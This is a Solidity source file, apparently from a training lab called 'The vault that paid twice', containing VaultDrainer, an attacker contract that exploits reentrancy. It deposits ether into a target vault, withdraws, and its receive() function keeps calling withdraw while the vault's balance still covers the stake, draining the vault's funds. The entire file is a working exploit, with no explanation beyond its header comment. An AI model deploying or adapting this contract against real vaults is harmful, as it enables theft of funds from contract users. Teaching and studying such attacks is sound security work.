// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IVaultA {
    function deposit() external payable;
    function withdraw() external;
}

/// @title VaultDrainer
/// @notice Training code for the lab "The vault that paid twice": the attacker's contract.
///         It deposits what it is sent, withdraws it, and each time the vault pays it, asks again
///         while the vault still holds as much as it deposited.
contract VaultDrainer {
    IVaultA public immutable vault;
    address public immutable owner;
    uint256 private stake;

    constructor(address target) {
        vault = IVaultA(target);
        owner = msg.sender;
    }

    function run() external payable {
        require(msg.sender == owner, "not the owner");
        stake = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= stake) {
            vault.withdraw();
        }
    }
}
